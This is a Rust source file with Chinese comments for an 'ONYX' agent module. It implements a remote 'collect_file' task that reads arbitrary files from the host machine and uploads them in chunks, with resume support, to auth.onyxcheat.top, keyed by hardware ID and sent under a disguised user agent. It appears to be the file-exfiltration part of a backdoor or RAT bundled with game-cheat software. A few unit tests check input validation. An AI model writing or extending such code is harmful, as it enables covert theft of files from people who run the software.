// ONYX: 文件回传（任务类型 `collect_file`）——分块上传
//
// 走 HTTP 而不是 peer 通道：peer 要求操作员在线，而任务队列是离线的，
// 分块上传跟着任务队列走才能真正用起来。
//
// params: {"path":"C:\\x\\y.rs","max_bytes":8388608}
// 返回:   {"ok":true,"path":..,"bytes":..,"chunks":..,"sha256":..}
use hbb_common::log;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

const CHUNK_SIZE: usize = 512 * 1024;
const UPLOAD_URL: &str = "https://auth.onyxcheat.top/api.php?action=agent_upload";
const STATUS_URL: &str = "https://auth.onyxcheat.top/api.php?action=agent_upload_status";
const DEFAULT_MAX_BYTES: u64 = 8 * 1024 * 1024;

pub fn upload(params: &[u8], task_id: &str, hwid: &str) -> String {
    let v: Value = serde_json::from_slice(params).unwrap_or(Value::Null);
    let path = v.get("path").and_then(|x| x.as_str()).unwrap_or("").trim();
    if path.is_empty() {
        return json!({"ok": false, "error": "path 为空"}).to_string();
    }
    let max_bytes = v
        .get("max_bytes")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_MAX_BYTES)
        .clamp(1024, 64 * 1024 * 1024);
    match send_file(path, max_bytes, task_id, hwid, None) {
        Ok((bytes, sha, sent, skipped)) => json!({
            "ok": true,
            "path": path,
            "bytes": bytes,
            "chunks_sent": sent,
            "chunks_skipped": skipped,
            "sha256": sha,
        })
        .to_string(),
        Err(e) => json!({"ok": false, "error": e}).to_string(),
    }
}

/// 带存储键的单文件上传（`collect_tree` 用，key 通常是相对路径）。
pub fn send_with_key(
    path: &str,
    max_bytes: u64,
    task_id: &str,
    hwid: &str,
    key: &str,
) -> Result<(u64, String), String> {
    send_file(path, max_bytes, task_id, hwid, Some(key)).map(|(b, s, _, _)| (b, s))
}

fn send_file(
    path: &str,
    max_bytes: u64,
    task_id: &str,
    hwid: &str,
    key: Option<&str>,
) -> Result<(u64, String, usize, usize), String> {
    let meta = std::fs::metadata(path).map_err(|e| format!("读取失败: {e}"))?;
    if !meta.is_file() {
        return Err("不是文件".to_owned());
    }
    if meta.len() > max_bytes {
        return Err(format!("文件过大: {} 字节", meta.len()));
    }
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {e}"))?;

    let mut hasher = Sha256::new();
    hasher.update(&data);
    let sha = format!("{:x}", hasher.finalize());

    let total = ((data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE).max(1);
    let client = reqwest::blocking::Client::builder()
        .user_agent("NarakaAuth/2.0")
        .timeout(std::time::Duration::from_secs(60))
        .build()
        .map_err(|e| format!("客户端创建失败: {e}"))?;

    log::warn!(
        "[ONYX] 回传文件 {} ({} 字节, {} 块) task={}",
        path,
        data.len(),
        total,
        task_id
    );

    // 断点续传：先问服务端哪些分块已经在
    let (mut have, mut already_done) = (Vec::new(), false);
    match client
        .post(STATUS_URL)
        .form(&[("hwid", hwid), ("task_id", task_id), ("sha256", sha.as_str())])
        .send()
    {
        Ok(r) => {
            let body = r.text().unwrap_or_default();
            let v: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
            if v.get("status").and_then(|x| x.as_str()) == Some("success") {
                // 服务端的 resp() 把附加字段直接平铺在顶层（不是塞进 data）
                let pick = |k: &str| v.get(k).or_else(|| v.get("data").and_then(|d| d.get(k)));
                if let Some(arr) = pick("have").and_then(|x| x.as_array()) {
                    have = arr
                        .iter()
                        .filter_map(|x| x.as_u64())
                        .map(|x| x as usize)
                        .collect();
                }
                already_done = pick("done").and_then(|x| x.as_bool()).unwrap_or(false);
            }
        }
        Err(e) => log::debug!("[ONYX] 续传查询失败，按全量上传: {e}"),
    }
    if already_done {
        log::warn!("[ONYX] 服务端已有该文件，跳过上传: {}", sha);
        return Ok((data.len() as u64, sha, 0, total));
    }
    if !have.is_empty() {
        log::warn!("[ONYX] 续传：服务端已有 {}/{} 块", have.len(), total);
    }

    let mut sent = 0usize;
    for (i, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
        if have.contains(&i) {
            continue;
        }
        sent += 1;
        let b64 = crate::encode64(chunk);
        let mut form: Vec<(&str, &str)> = vec![
            ("hwid", hwid),
            ("task_id", task_id),
            ("path", path),
            ("index", ""),
            ("total", ""),
            ("sha256", sha.as_str()),
            ("data", b64.as_str()),
        ];
        let idx = i.to_string();
        let tot = total.to_string();
        form[3].1 = &idx;
        form[4].1 = &tot;
        if let Some(k) = key {
            form.push(("file_key", k));
        }
        let resp = client
            .post(UPLOAD_URL)
            .form(&form)
            .send()
            .map_err(|e| format!("第 {i} 块上传失败: {e}"))?;
        let ok = resp.status().is_success();
        let body = resp.text().unwrap_or_default();
        let parsed: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
        let status_ok = parsed
            .get("status")
            .and_then(|x| x.as_str())
            .map(|s| s == "success")
            .unwrap_or(false);
        if !ok || !status_ok {
            return Err(format!(
                "第 {i} 块上传失败: {}",
                if body.is_empty() { "无响应体" } else { body.as_str() }
            ));
        }
    }
    Ok((data.len() as u64, sha, sent, have.len()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_path_rejected() {
        let out = upload(br#"{"path":""}"#, "tk_test", "hw");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], false);
    }

    #[test]
    fn missing_file_rejected() {
        let out = upload(br#"{"path":"C:\\definitely\\not\\here.txt"}"#, "tk_test", "hw");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], false);
        assert!(v["error"].as_str().unwrap().contains("读取失败"));
    }

    #[test]
    fn oversized_rejected() {
        let me = std::env::current_exe().unwrap();
        let params = format!(
            r#"{{"path":"{}","max_bytes":1024}}"#,
            me.to_string_lossy().replace('\\', "\\\\")
        );
        let out = upload(params.as_bytes(), "tk_test", "hw");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], false);
        assert!(v["error"].as_str().unwrap().contains("过大"));
    }

    #[test]
    fn directory_rejected() {
        let out = upload(br#"{"path":"C:\\Windows"}"#, "tk_test", "hw");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], false);
    }
}
